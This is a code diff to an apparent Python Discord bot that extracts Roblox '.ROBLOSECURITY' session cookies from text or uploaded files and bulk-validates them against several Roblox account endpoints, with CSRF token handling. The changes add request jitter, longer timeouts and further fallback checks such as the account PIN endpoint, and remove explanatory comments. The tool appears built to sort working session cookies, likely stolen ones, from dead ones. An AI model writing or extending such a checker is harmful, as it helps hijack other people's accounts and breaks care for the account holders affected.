@@ -46,7 +46,7 @@ EMOJ = {
 # ========================
 # 네트워크
 # ========================
-AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=20, sock_connect=4, sock_read=12)
+AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, sock_connect=5, sock_read=15)
 TCP_CONN: aiohttp.TCPConnector | None = None
 
 def new_session(cookies=None):
@@ -67,6 +67,7 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
     while True:
         tries += 1
         try:
+            await asyncio.sleep(random.uniform(0.02, 0.08))
             async with session.request(method, url, **kw) as r:
                 if r.status == 429:
                     ra = r.headers.get("Retry-After")
@@ -83,11 +84,9 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
                     except:
                         data = {"error": await r.text()}
                     return r.status, data
-                # 2xx
                 ct = r.headers.get("Content-Type", "")
                 if "application/json" in ct:
                     return r.status, await r.json()
-                # 혹시 JSON 아닌데 본문이 비어있을 수 있음
                 txt = await r.text()
                 try:
                     return r.status, json.loads(txt)
@@ -185,10 +184,8 @@ def _clean_token(v: str) -> str:
 def extract_tokens_from_text(text: str) -> list[str]:
     text = normalize_text(text or "")
     out = []
-    # 1) WARNING 우선(라인 중복까지)
     for m in ORDER_TOKEN_RE.finditer(text):
         out.append(_clean_token(m.group(1)))
-    # 2) 백업 패턴(.ROBLOSECURITY/헤더/JSON)
     for rgx in BACKUP_PATTERNS:
         for m in rgx.finditer(text):
             raw = _clean_token(m.group(1))
@@ -208,7 +205,6 @@ def parse_cookies_blob(raw_text: str) -> list[tuple[str, str]]:
             continue
         if any(ch.isspace() for ch in tok):
             continue
-        # 라이트 필터: 시작 패턴 + 최소 길이
         if not (tok.startswith("_|WARNING") or tok.startswith("|WARNING")):
             continue
         if len(tok) < MIN_TOKEN_LEN:
@@ -248,7 +244,6 @@ async def csrf_probe(session: aiohttp.ClientSession) -> tuple[bool, str | None]:
             xcsrf = r.headers.get("x-csrf-token")
             if xcsrf:
                 return True, xcsrf
-            # 401/403이어도 헤더만 오면 인정
             if r.status in (401, 403) and xcsrf:
                 return True, xcsrf
             return False, None
@@ -259,6 +254,10 @@ async def check_cookie_once_quick(session: aiohttp.ClientSession, hdr: dict):
     stA, dataA = await fetch_json_with_retry(session, "GET", "https://www.roblox.com/my/settings/json", headers=hdr)
     if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
         return True, None, None, dataA.get("Name") or dataA.get("UserName")
+
+    stAw, dataAw = await fetch_json_with_retry(session, "GET", "https://web.roblox.com/my/settings/json", headers=hdr)
+    if stAw == 200 and isinstance(dataAw, dict) and (dataAw.get("Name") or dataAw.get("UserName")):
+        return True, None, None, dataAw.get("Name") or dataAw.get("UserName")
 
     stB, dataB = await fetch_json_with_retry(session, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=hdr)
     if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
@@ -274,7 +273,11 @@ async def check_cookie_once_quick(session: aiohttp.ClientSession, hdr: dict):
     if stD == 200 and isinstance(dataD, dict):
         return True, None, None, None
 
-    bad = stA or stB or stC or stD
+    stP, pin = await fetch_json_with_retry(session, "GET", "https://auth.roblox.com/v1/account/pin", headers=hdr)
+    if stP == 200 and isinstance(pin, dict) and "isEnabled" in pin:
+        return True, None, None, None
+
+    bad = stA or stAw or stB or stC or stD or stP
     if bad in (401, 403):
         return False, None, None, None
     return False, f"unexpected {bad}", None, None
@@ -297,13 +300,11 @@ async def check_cookie_once(cookie_value: str):
                 ok_csrf, xcsrf = await csrf_probe(s)
                 if not ok_csrf:
                     return False, "csrf_fail", None, None
-                # xcsrf를 꼭 붙여야 하는 엔드포인트도 있으니 헤더에 추가
                 hdr2 = dict(HDR)
                 hdr2["X-CSRF-TOKEN"] = xcsrf
                 res = await check_cookie_once_quick(s, hdr2)
                 if res[0]:
                     return res
-                # 엄격 모드에서 튀었어도 한 번 더 기본 헤더로
                 res2 = await check_cookie_once_quick(s, HDR)
                 return res2
             else:
@@ -547,7 +548,6 @@ class DMFilePromptView(discord.ui.View):
             self.busy = False
             return await dm.send(embed=make_embed(None, "파일이 비어있어. 다시 올려줘!", color=discord.Color.red()))
 
-        # 진행 중 임베드 먼저 표시(제목 없음)
         await dm.send(embed=progress_embed())
 
         try:
